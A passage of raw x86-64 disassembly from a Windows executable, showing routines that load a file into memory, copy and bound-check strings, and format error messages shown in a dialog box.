   1400016f0:	45 33 c0             	xor    %r8d,%r8d
   1400016f3:	48 8b 0b             	mov    (%rbx),%rcx
   1400016f6:	8b d0                	mov    %eax,%edx
   1400016f8:	e8 e3 9d 00 00       	call   0x14000b4e0
   1400016fd:	8b 4b 30             	mov    0x30(%rbx),%ecx
   140001700:	e8 6d 74 00 00       	call   0x140008b72
   140001705:	8b c8                	mov    %eax,%ecx
   140001707:	e8 c8 96 00 00       	call   0x14000add4
   14000170c:	48 89 43 10          	mov    %rax,0x10(%rbx)
   140001710:	48 85 c0             	test   %rax,%rax
   140001713:	75 1c                	jne    0x140001731
   140001715:	48 8d 15 3c 0e 02 00 	lea    0x20e3c(%rip),%rdx        # 0x140022558
   14000171c:	48 8d 0d 59 0e 02 00 	lea    0x20e59(%rip),%rcx        # 0x14002257c
   140001723:	e8 38 02 00 00       	call   0x140001960
   140001728:	83 c8 ff             	or     $0xffffffff,%eax
   14000172b:	48 83 c4 20          	add    $0x20,%rsp
   14000172f:	5b                   	pop    %rbx
   140001730:	c3                   	ret
   140001731:	8b 4b 30             	mov    0x30(%rbx),%ecx
   140001734:	e8 39 74 00 00       	call   0x140008b72
   140001739:	4c 8b 0b             	mov    (%rbx),%r9
   14000173c:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001742:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140001746:	8b d0                	mov    %eax,%edx
   140001748:	e8 57 9a 00 00       	call   0x14000b1a4
   14000174d:	48 83 f8 01          	cmp    $0x1,%rax
   140001751:	73 1c                	jae    0x14000176f
   140001753:	48 8d 15 2e 0e 02 00 	lea    0x20e2e(%rip),%rdx        # 0x140022588
   14000175a:	48 8d 0d 43 0e 02 00 	lea    0x20e43(%rip),%rcx        # 0x1400225a4
   140001761:	e8 fa 01 00 00       	call   0x140001960
   140001766:	83 c8 ff             	or     $0xffffffff,%eax
   140001769:	48 83 c4 20          	add    $0x20,%rsp
   14000176d:	5b                   	pop    %rbx
   14000176e:	c3                   	ret
   14000176f:	8b 4b 30             	mov    0x30(%rbx),%ecx
   140001772:	e8 fb 73 00 00       	call   0x140008b72
   140001777:	8b c8                	mov    %eax,%ecx
   140001779:	48 03 4b 10          	add    0x10(%rbx),%rcx
   14000177d:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   140001781:	48 8b 0b             	mov    (%rbx),%rcx
   140001784:	e8 6f 97 00 00       	call   0x14000aef8
   140001789:	85 c0                	test   %eax,%eax
   14000178b:	74 15                	je     0x1400017a2
   14000178d:	48 8d 0d 1c 0e 02 00 	lea    0x20e1c(%rip),%rcx        # 0x1400225b0
   140001794:	e8 e7 05 00 00       	call   0x140001d80
   140001799:	83 c8 ff             	or     $0xffffffff,%eax
   14000179c:	48 83 c4 20          	add    $0x20,%rsp
   1400017a0:	5b                   	pop    %rbx
   1400017a1:	c3                   	ret
   1400017a2:	48 8b 0b             	mov    (%rbx),%rcx
   1400017a5:	48 85 c9             	test   %rcx,%rcx
   1400017a8:	74 0c                	je     0x1400017b6
   1400017aa:	e8 b1 96 00 00       	call   0x14000ae60
   1400017af:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   1400017b6:	33 c0                	xor    %eax,%eax
   1400017b8:	48 83 c4 20          	add    $0x20,%rsp
   1400017bc:	5b                   	pop    %rbx
   1400017bd:	c3                   	ret
   1400017be:	cc                   	int3
   1400017bf:	cc                   	int3
   1400017c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400017c5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400017ca:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400017cf:	41 56                	push   %r14
   1400017d1:	48 83 ec 20          	sub    $0x20,%rsp
   1400017d5:	48 8b fa             	mov    %rdx,%rdi
   1400017d8:	48 8b f1             	mov    %rcx,%rsi
   1400017db:	48 8b cf             	mov    %rdi,%rcx
   1400017de:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400017e3:	4d 8b f0             	mov    %r8,%r14
   1400017e6:	e8 95 92 00 00       	call   0x14000aa80
   1400017eb:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400017f0:	49 8b ce             	mov    %r14,%rcx
   1400017f3:	48 8b d8             	mov    %rax,%rbx
   1400017f6:	e8 85 92 00 00       	call   0x14000aa80
   1400017fb:	4c 8d 48 01          	lea    0x1(%rax),%r9
   1400017ff:	4c 03 cb             	add    %rbx,%r9
   140001802:	49 81 f9 00 10 00 00 	cmp    $0x1000,%r9
   140001809:	76 08                	jbe    0x140001813
   14000180b:	83 c8 ff             	or     $0xffffffff,%eax
   14000180e:	e9 8d 00 00 00       	jmp    0x1400018a0
   140001813:	4c 8b c6             	mov    %rsi,%r8
   140001816:	48 8d 4e 77          	lea    0x77(%rsi),%rcx
   14000181a:	4c 2b c7             	sub    %rdi,%r8
   14000181d:	48 8b d7             	mov    %rdi,%rdx
   140001820:	0f b6 02             	movzbl (%rdx),%eax
   140001823:	41 88 44 10 78       	mov    %al,0x78(%r8,%rdx,1)
   140001828:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000182c:	84 c0                	test   %al,%al
   14000182e:	75 f0                	jne    0x140001820
   140001830:	80 79 01 00          	cmpb   $0x0,0x1(%rcx)
   140001834:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   140001838:	75 f6                	jne    0x140001830
   14000183a:	33 d2                	xor    %edx,%edx
   14000183c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001840:	41 0f b6 04 16       	movzbl (%r14,%rdx,1),%eax
   140001845:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   140001848:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   14000184c:	84 c0                	test   %al,%al
   14000184e:	75 f0                	jne    0x140001840
   140001850:	48 8d 86 78 10 00 00 	lea    0x1078(%rsi),%rax
   140001857:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000185e:	00 00 
   140001860:	0f b6 0f             	movzbl (%rdi),%ecx
   140001863:	41 88 8c 38 78 10 00 	mov    %cl,0x1078(%r8,%rdi,1)
   14000186a:	00 
   14000186b:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   14000186f:	84 c9                	test   %cl,%cl
   140001871:	75 ed                	jne    0x140001860
   140001873:	48 8d 96 78 30 00 00 	lea    0x3078(%rsi),%rdx
   14000187a:	c7 86 78 40 00 00 00 	movl   $0x0,0x4078(%rsi)
   140001881:	00 00 00 
   140001884:	48 2b d0             	sub    %rax,%rdx
   140001887:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000188e:	00 00 
   140001890:	0f b6 08             	movzbl (%rax),%ecx
   140001893:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
   140001896:	48 8d 40 01          	lea    0x1(%rax),%rax
   14000189a:	84 c9                	test   %cl,%cl
   14000189c:	75 f2                	jne    0x140001890
   14000189e:	33 c0                	xor    %eax,%eax
   1400018a0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400018a5:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400018aa:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   1400018af:	48 83 c4 20          	add    $0x20,%rsp
   1400018b3:	41 5e                	pop    %r14
   1400018b5:	c3                   	ret
   1400018b6:	cc                   	int3
   1400018b7:	cc                   	int3
   1400018b8:	cc                   	int3
   1400018b9:	cc                   	int3
   1400018ba:	cc                   	int3
   1400018bb:	cc                   	int3
   1400018bc:	cc                   	int3
   1400018bd:	cc                   	int3
   1400018be:	cc                   	int3
   1400018bf:	cc                   	int3
   1400018c0:	40 53                	rex push %rbx
   1400018c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400018c6:	48 8b d9             	mov    %rcx,%rbx
   1400018c9:	e8 f2 fe ff ff       	call   0x1400017c0
   1400018ce:	85 c0                	test   %eax,%eax
   1400018d0:	75 20                	jne    0x1400018f2
   1400018d2:	48 8b cb             	mov    %rbx,%rcx
   1400018d5:	e8 96 fd ff ff       	call   0x140001670
   1400018da:	85 c0                	test   %eax,%eax
   1400018dc:	74 1d                	je     0x1400018fb
   1400018de:	48 8b 0b             	mov    (%rbx),%rcx
   1400018e1:	48 85 c9             	test   %rcx,%rcx
   1400018e4:	74 0c                	je     0x1400018f2
   1400018e6:	e8 75 95 00 00       	call   0x14000ae60
   1400018eb:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   1400018f2:	83 c8 ff             	or     $0xffffffff,%eax
   1400018f5:	48 83 c4 20          	add    $0x20,%rsp
   1400018f9:	5b                   	pop    %rbx
   1400018fa:	c3                   	ret
   1400018fb:	33 c0                	xor    %eax,%eax
   1400018fd:	48 83 c4 20          	add    $0x20,%rsp
   140001901:	5b                   	pop    %rbx
   140001902:	c3                   	ret
   140001903:	cc                   	int3
   140001904:	cc                   	int3
   140001905:	cc                   	int3
   140001906:	cc                   	int3
   140001907:	cc                   	int3
   140001908:	cc                   	int3
   140001909:	cc                   	int3
   14000190a:	cc                   	int3
   14000190b:	cc                   	int3
   14000190c:	cc                   	int3
   14000190d:	cc                   	int3
   14000190e:	cc                   	int3
   14000190f:	cc                   	int3
   140001910:	48 85 c9             	test   %rcx,%rcx
   140001913:	74 37                	je     0x14000194c
   140001915:	53                   	push   %rbx
   140001916:	48 83 ec 20          	sub    $0x20,%rsp
   14000191a:	48 8b d9             	mov    %rcx,%rbx
   14000191d:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140001921:	48 85 c9             	test   %rcx,%rcx
   140001924:	74 05                	je     0x14000192b
   140001926:	e8 a1 94 00 00       	call   0x14000adcc
   14000192b:	48 8b 0b             	mov    (%rbx),%rcx
   14000192e:	48 85 c9             	test   %rcx,%rcx
   140001931:	74 0c                	je     0x14000193f
   140001933:	e8 28 95 00 00       	call   0x14000ae60
   140001938:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   14000193f:	48 8b cb             	mov    %rbx,%rcx
   140001942:	e8 85 94 00 00       	call   0x14000adcc
   140001947:	48 83 c4 20          	add    $0x20,%rsp
   14000194b:	5b                   	pop    %rbx
   14000194c:	c3                   	ret
   14000194d:	cc                   	int3
   14000194e:	cc                   	int3
   14000194f:	cc                   	int3
   140001950:	48 8d 05 89 f7 03 00 	lea    0x3f789(%rip),%rax        # 0x1400410e0
   140001957:	c3                   	ret
   140001958:	cc                   	int3
   140001959:	cc                   	int3
   14000195a:	cc                   	int3
   14000195b:	cc                   	int3
   14000195c:	cc                   	int3
   14000195d:	cc                   	int3
   14000195e:	cc                   	int3
   14000195f:	cc                   	int3
   140001960:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001965:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000196a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000196f:	b8 68 14 00 00       	mov    $0x1468,%eax
   140001974:	e8 d7 72 00 00       	call   0x140008c50
   140001979:	48 2b e0             	sub    %rax,%rsp
   14000197c:	48 8b 05 8d 06 03 00 	mov    0x3068d(%rip),%rax        # 0x140032010
   140001983:	48 33 c4             	xor    %rsp,%rax
   140001986:	48 89 84 24 30 14 00 	mov    %rax,0x1430(%rsp)
   14000198d:	00 
   14000198e:	48 89 9c 24 60 14 00 	mov    %rbx,0x1460(%rsp)
   140001995:	00 
   140001996:	48 8b da             	mov    %rdx,%rbx
   140001999:	48 89 b4 24 50 14 00 	mov    %rsi,0x1450(%rsp)
   1400019a0:	00 
   1400019a1:	48 8b f1             	mov    %rcx,%rsi
   1400019a4:	48 89 bc 24 48 14 00 	mov    %rdi,0x1448(%rsp)
   1400019ab:	00 
   1400019ac:	48 8d bc 24 80 14 00 	lea    0x1480(%rsp),%rdi
   1400019b3:	00 
   1400019b4:	e8 97 ff ff ff       	call   0x140001950
   1400019b9:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400019be:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400019c3:	4c 8b cb             	mov    %rbx,%r9
   1400019c6:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400019cd:	00 00 
   1400019cf:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   1400019d5:	48 8b 08             	mov    (%rax),%rcx
   1400019d8:	48 83 c9 01          	or     $0x1,%rcx
   1400019dc:	e8 43 c6 00 00       	call   0x14000e024
   1400019e1:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   1400019e5:	8b f8                	mov    %eax,%edi
   1400019e7:	85 c0                	test   %eax,%eax
   1400019e9:	0f 48 fb             	cmovs  %ebx,%edi
   1400019ec:	81 ff 00 04 00 00    	cmp    $0x400,%edi
   1400019f2:	0f 8d 92 00 00 00    	jge    0x140001a8a
   1400019f8:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400019fd:	48 89 ac 24 58 14 00 	mov    %rbp,0x1458(%rsp)
   140001a04:	00 
   140001a05:	bd ff 03 00 00       	mov    $0x3ff,%ebp
   140001a0a:	48 8b d6             	mov    %rsi,%rdx
   140001a0d:	8b cd                	mov    %ebp,%ecx
   140001a0f:	2b cf                	sub    %edi,%ecx
   140001a11:	4c 63 c1             	movslq %ecx,%r8
   140001a14:	48 63 cf             	movslq %edi,%rcx
   140001a17:	48 03 c8             	add    %rax,%rcx
   140001a1a:	e8 01 cc 00 00       	call   0x14000e620
   140001a1f:	90                   	nop
   140001a20:	48 ff c3             	inc    %rbx
   140001a23:	80 3c 1e 00          	cmpb   $0x0,(%rsi,%rbx,1)
   140001a27:	75 f7                	jne    0x140001a20
   140001a29:	03 fb                	add    %ebx,%edi
   140001a2b:	81 ff 00 04 00 00    	cmp    $0x400,%edi
   140001a31:	7d 4f                	jge    0x140001a82
   140001a33:	48 63 c7             	movslq %edi,%rax
   140001a36:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001a3b:	48 03 c8             	add    %rax,%rcx
   140001a3e:	48 8d 15 a3 0b 02 00 	lea    0x20ba3(%rip),%rdx        # 0x1400225e8
   140001a45:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001a4b:	e8 d0 cb 00 00       	call   0x14000e620
   140001a50:	83 c7 02             	add    $0x2,%edi
   140001a53:	81 ff 00 04 00 00    	cmp    $0x400,%edi
   140001a59:	7d 27                	jge    0x140001a82
   140001a5b:	e8 e8 ca 00 00       	call   0x14000e548
   140001a60:	2b ef                	sub    %edi,%ebp
   140001a62:	48 63 dd             	movslq %ebp,%rbx
   140001a65:	8b 08                	mov    (%rax),%ecx
   140001a67:	e8 fc ca 00 00       	call   0x14000e568
   140001a6c:	48 8b d0             	mov    %rax,%rdx
   140001a6f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001a74:	48 63 c7             	movslq %edi,%rax
   140001a77:	4c 8b c3             	mov    %rbx,%r8
   140001a7a:	48 03 c8             	add    %rax,%rcx
   140001a7d:	e8 9e cb 00 00       	call   0x14000e620
   140001a82:	48 8b ac 24 58 14 00 	mov    0x1458(%rsp),%rbp
   140001a89:	00 
   140001a8a:	33 d2                	xor    %edx,%edx
   140001a8c:	c6 84 24 2f 04 00 00 	movb   $0x0,0x42f(%rsp)
   140001a93:	00 
   140001a94:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140001a9a:	48 8d 8c 24 30 04 00 	lea    0x430(%rsp),%rcx
   140001aa1:	00 
   140001aa2:	e8 79 7f 00 00       	call   0x140009a20
   140001aa7:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140001aad:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001ab2:	48 8d 8c 24 30 0c 00 	lea    0xc30(%rsp),%rcx
   140001ab9:	00 
   140001aba:	e8 f1 3f 00 00       	call   0x140005ab0
   140001abf:	48 8b bc 24 48 14 00 	mov    0x1448(%rsp),%rdi
   140001ac6:	00 
   140001ac7:	48 8b b4 24 50 14 00 	mov    0x1450(%rsp),%rsi
   140001ace:	00 
   140001acf:	48 8b 9c 24 60 14 00 	mov    0x1460(%rsp),%rbx
   140001ad6:	00 
   140001ad7:	48 85 c0             	test   %rax,%rax
   140001ada:	74 50                	je     0x140001b2c
   140001adc:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140001ae2:	48 8d 15 d7 0a 02 00 	lea    0x20ad7(%rip),%rdx        # 0x1400225c0
   140001ae9:	48 8d 8c 24 30 04 00 	lea    0x430(%rsp),%rcx
   140001af0:	00 
   140001af1:	e8 ba 3f 00 00       	call   0x140005ab0
   140001af6:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   140001afc:	4c 8d 84 24 30 04 00 	lea    0x430(%rsp),%r8
   140001b03:	00 
   140001b04:	48 8d 94 24 30 0c 00 	lea    0xc30(%rsp),%rdx
   140001b0b:	00 
   140001b0c:	33 c9                	xor    %ecx,%ecx
   140001b0e:	ff 15 fc 07 02 00    	call   *0x207fc(%rip)        # 0x140022310
   140001b14:	48 8b 8c 24 30 14 00 	mov    0x1430(%rsp),%rcx
   140001b1b:	00 
   140001b1c:	48 33 cc             	xor    %rsp,%rcx
   140001b1f:	e8 ec 70 00 00       	call   0x140008c10
   140001b24:	48 81 c4 68 14 00 00 	add    $0x1468,%rsp
   140001b2b:	c3                   	ret
   140001b2c:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   140001b32:	4c 8d 05 87 0a 02 00 	lea    0x20a87(%rip),%r8        # 0x1400225c0
   140001b39:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001b3e:	33 c9                	xor    %ecx,%ecx
   140001b40:	ff 15 d2 07 02 00    	call   *0x207d2(%rip)        # 0x140022318
   140001b46:	48 8b 8c 24 30 14 00 	mov    0x1430(%rsp),%rcx
   140001b4d:	00 
   140001b4e:	48 33 cc             	xor    %rsp,%rcx
   140001b51:	e8 ba 70 00 00       	call   0x140008c10
   140001b56:	48 81 c4 68 14 00 00 	add    $0x1468,%rsp
   140001b5d:	c3                   	ret
   140001b5e:	cc                   	int3
   140001b5f:	cc                   	int3
   140001b60:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001b65:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001b6a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001b6f:	b8 68 14 00 00       	mov    $0x1468,%eax
   140001b74:	e8 d7 70 00 00       	call   0x140008c50
   140001b79:	48 2b e0             	sub    %rax,%rsp
   140001b7c:	48 8b 05 8d 04 03 00 	mov    0x3048d(%rip),%rax        # 0x140032010
   140001b83:	48 33 c4             	xor    %rsp,%rax
   140001b86:	48 89 84 24 30 14 00 	mov    %rax,0x1430(%rsp)
   140001b8d:	00 
   140001b8e:	48 89 9c 24 60 14 00 	mov    %rbx,0x1460(%rsp)
   140001b95:	00 
   140001b96:	48 89 b4 24 50 14 00 	mov    %rsi,0x1450(%rsp)
   140001b9d:	00 
   140001b9e:	48 8b f1             	mov    %rcx,%rsi
   140001ba1:	48 89 bc 24 48 14 00 	mov    %rdi,0x1448(%rsp)
   140001ba8:	00 
   140001ba9:	4c 89 b4 24 40 14 00 	mov    %r14,0x1440(%rsp)
   140001bb0:	00 
   140001bb1:	ff 15 61 04 02 00    	call   *0x20461(%rip)        # 0x140022018
   140001bb7:	44 8b f0             	mov    %eax,%r14d
   140001bba:	48 8d 9c 24 80 14 00 	lea    0x1480(%rsp),%rbx
   140001bc1:	00 
   140001bc2:	e8 89 fd ff ff       	call   0x140001950
   140001bc7:	4c 8b 8c 24 78 14 00 	mov    0x1478(%rsp),%r9
   140001bce:	00 
   140001bcf:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001bd4:	48 89 5c 24 28       	mov    %rbx,0x28(%rsp)
   140001bd9:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140001bdf:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001be6:	00 00 
   140001be8:	48 8b 08             	mov    (%rax),%rcx
   140001beb:	48 83 c9 01          	or     $0x1,%rcx
   140001bef:	e8 30 c4 00 00       	call   0x14000e024
   140001bf4:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   140001bf8:	8b f8                	mov    %eax,%edi
   140001bfa:	85 c0                	test   %eax,%eax
   140001bfc:	0f 48 fb             	cmovs  %ebx,%edi
   140001bff:	81 ff 00 04 00 00    	cmp    $0x400,%edi
   140001c05:	0f 8d 8d 00 00 00    	jge    0x140001c98
   140001c0b:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140001c10:	48 89 ac 24 58 14 00 	mov    %rbp,0x1458(%rsp)
   140001c17:	00 
   140001c18:	bd ff 03 00 00       	mov    $0x3ff,%ebp
   140001c1d:	48 8b d6             	mov    %rsi,%rdx
   140001c20:	8b cd                	mov    %ebp,%ecx
   140001c22:	2b cf                	sub    %edi,%ecx
   140001c24:	4c 63 c1             	movslq %ecx,%r8
   140001c27:	48 63 cf             	movslq %edi,%rcx
   140001c2a:	48 03 c8             	add    %rax,%rcx
   140001c2d:	e8 ee c9 00 00       	call   0x14000e620
   140001c32:	48 ff c3             	inc    %rbx
   140001c35:	80 3c 1e 00          	cmpb   $0x0,(%rsi,%rbx,1)
   140001c39:	75 f7                	jne    0x140001c32
   140001c3b:	03 fb                	add    %ebx,%edi
   140001c3d:	81 ff 00 04 00 00    	cmp    $0x400,%edi
   140001c43:	7d 4b                	jge    0x140001c90
   140001c45:	48 63 c7             	movslq %edi,%rax
   140001c48:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001c4d:	48 03 c8             	add    %rax,%rcx
   140001c50:	48 8d 15 91 09 02 00 	lea    0x20991(%rip),%rdx        # 0x1400225e8
   140001c57:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001c5d:	e8 be c9 00 00       	call   0x14000e620
   140001c62:	83 c7 02             	add    $0x2,%edi
   140001c65:	81 ff 00 04 00 00    	cmp    $0x400,%edi
   140001c6b:	7d 23                	jge    0x140001c90
   140001c6d:	2b ef                	sub    %edi,%ebp
   140001c6f:	41 8b ce             	mov    %r14d,%ecx
   140001c72:	48 63 dd             	movslq %ebp,%rbx
   140001c75:	e8 a6 38 00 00       	call   0x140005520
   140001c7a:	48 8b d0             	mov    %rax,%rdx
   140001c7d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001c82:	48 63 c7             	movslq %edi,%rax
   140001c85:	4c 8b c3             	mov    %rbx,%r8
   140001c88:	48 03 c8             	add    %rax,%rcx
   140001c8b:	e8 90 c9 00 00       	call   0x14000e620
   140001c90:	48 8b ac 24 58 14 00 	mov    0x1458(%rsp),%rbp
   140001c97:	00 
   140001c98:	33 d2                	xor    %edx,%edx
   140001c9a:	c6 84 24 2f 04 00 00 	movb   $0x0,0x42f(%rsp)
   140001ca1:	00 
   140001ca2:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140001ca8:	48 8d 8c 24 30 04 00 	lea    0x430(%rsp),%rcx
   140001caf:	00 
   140001cb0:	e8 6b 7d 00 00       	call   0x140009a20
   140001cb5:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140001cbb:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001cc0:	48 8d 8c 24 30 0c 00 	lea    0xc30(%rsp),%rcx
   140001cc7:	00 
   140001cc8:	e8 e3 3d 00 00       	call   0x140005ab0
   140001ccd:	4c 8b b4 24 40 14 00 	mov    0x1440(%rsp),%r14
   140001cd4:	00 
   140001cd5:	48 8b bc 24 48 14 00 	mov    0x1448(%rsp),%rdi
   140001cdc:	00 
   140001cdd:	48 8b b4 24 50 14 00 	mov    0x1450(%rsp),%rsi
   140001ce4:	00 
   140001ce5:	48 8b 9c 24 60 14 00 	mov    0x1460(%rsp),%rbx
   140001cec:	00 
   140001ced:	48 85 c0             	test   %rax,%rax
   140001cf0:	74 50                	je     0x140001d42
   140001cf2:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140001cf8:	48 8d 15 c1 08 02 00 	lea    0x208c1(%rip),%rdx        # 0x1400225c0
   140001cff:	48 8d 8c 24 30 04 00 	lea    0x430(%rsp),%rcx
   140001d06:	00 
   140001d07:	e8 a4 3d 00 00       	call   0x140005ab0
   140001d0c:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   140001d12:	4c 8d 84 24 30 04 00 	lea    0x430(%rsp),%r8
   140001d19:	00 
   140001d1a:	48 8d 94 24 30 0c 00 	lea    0xc30(%rsp),%rdx
   140001d21:	00 
   140001d22:	33 c9                	xor    %ecx,%ecx
   140001d24:	ff 15 e6 05 02 00    	call   *0x205e6(%rip)        # 0x140022310
   140001d2a:	48 8b 8c 24 30 14 00 	mov    0x1430(%rsp),%rcx
   140001d31:	00 
   140001d32:	48 33 cc             	xor    %rsp,%rcx
   140001d35:	e8 d6 6e 00 00       	call   0x140008c10
   140001d3a:	48 81 c4 68 14 00 00 	add    $0x1468,%rsp
   140001d41:	c3                   	ret
   140001d42:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   140001d48:	4c 8d 05 71 08 02 00 	lea    0x20871(%rip),%r8        # 0x1400225c0
   140001d4f:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001d54:	33 c9                	xor    %ecx,%ecx
   140001d56:	ff 15 bc 05 02 00    	call   *0x205bc(%rip)        # 0x140022318
   140001d5c:	48 8b 8c 24 30 14 00 	mov    0x1430(%rsp),%rcx
   140001d63:	00 
   140001d64:	48 33 cc             	xor    %rsp,%rcx
   140001d67:	e8 a4 6e 00 00       	call   0x140008c10
   140001d6c:	48 81 c4 68 14 00 00 	add    $0x1468,%rsp
   140001d73:	c3                   	ret
   140001d74:	cc                   	int3
   140001d75:	cc                   	int3
   140001d76:	cc                   	int3
   140001d77:	cc                   	int3
   140001d78:	cc                   	int3
   140001d79:	cc                   	int3
   140001d7a:	cc                   	int3
   140001d7b:	cc                   	int3
   140001d7c:	cc                   	int3
   140001d7d:	cc                   	int3
   140001d7e:	cc                   	int3
   140001d7f:	cc                   	int3
   140001d80:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001d85:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140001d8a:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001d8f:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140001d94:	53                   	push   %rbx
   140001d95:	57                   	push   %rdi
   140001d96:	b8 48 14 00 00       	mov    $0x1448,%eax
   140001d9b:	e8 b0 6e 00 00       	call   0x140008c50
   140001da0:	48 2b e0             	sub    %rax,%rsp
   140001da3:	48 8b 05 66 02 03 00 	mov    0x30266(%rip),%rax        # 0x140032010
   140001daa:	48 33 c4             	xor    %rsp,%rax
   140001dad:	48 89 84 24 30 14 00 	mov    %rax,0x1430(%rsp)
   140001db4:	00 
   140001db5:	48 8b d9             	mov    %rcx,%rbx
   140001db8:	48 8d bc 24 68 14 00 	lea    0x1468(%rsp),%rdi
   140001dbf:	00 
   140001dc0:	e8 8b fb ff ff       	call   0x140001950
   140001dc5:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140001dca:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001dcf:	4c 8b cb             	mov    %rbx,%r9
   140001dd2:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001dd9:	00 00 
   140001ddb:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140001de1:	48 8b 08             	mov    (%rax),%rcx
   140001de4:	48 83 c9 01          	or     $0x1,%rcx
   140001de8:	e8 37 c2 00 00       	call   0x14000e024
   140001ded:	33 d2                	xor    %edx,%edx
   140001def:	48 8d 8c 24 30 04 00 	lea    0x430(%rsp),%rcx
   140001df6:	00 
   140001df7:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140001dfd:	e8 1e 7c 00 00       	call   0x140009a20
   140001e02:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140001e08:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001e0d:	48 8d 8c 24 30 0c 00 	lea    0xc30(%rsp),%rcx
   140001e14:	00 
   140001e15:	e8 96 3c 00 00       	call   0x140005ab0
   140001e1a:	48 85 c0             	test   %rax,%rax
   140001e1d:	74 3a                	je     0x140001e59
   140001e1f:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140001e25:	48 8d 15 94 07 02 00 	lea    0x20794(%rip),%rdx        # 0x1400225c0
   140001e2c:	48 8d 8c 24 30 04 00 	lea    0x430(%rsp),%rcx
   140001e33:	00 
   140001e34:	e8 77 3c 00 00       	call   0x140005ab0
   140001e39:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   140001e3f:	4c 8d 84 24 30 04 00 	lea    0x430(%rsp),%r8
   140001e46:	00 
   140001e47:	48 8d 94 24 30 0c 00 	lea    0xc30(%rsp),%rdx
   140001e4e:	00 
   140001e4f:	33 c9                	xor    %ecx,%ecx
   140001e51:	ff 15 b9 04 02 00    	call   *0x204b9(%rip)        # 0x140022310
   140001e57:	eb 1a                	jmp    0x140001e73
   140001e59:	41 b9 30 00 00 00    	mov    $0x30,%r9d
   140001e5f:	4c 8d 05 5a 07 02 00 	lea    0x2075a(%rip),%r8        # 0x1400225c0
   140001e66:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140001e6b:	33 c9                	xor    %ecx,%ecx
   140001e6d:	ff 15 a5 04 02 00    	call   *0x204a5(%rip)        # 0x140022318
   140001e73:	48 8b 8c 24 30 14 00 	mov    0x1430(%rsp),%rcx
   140001e7a:	00 
   140001e7b:	48 33 cc             	xor    %rsp,%rcx
   140001e7e:	e8 8d 6d 00 00       	call   0x140008c10
   140001e83:	48 81 c4 48 14 00 00 	add    $0x1448,%rsp
   140001e8a:	5f                   	pop    %rdi
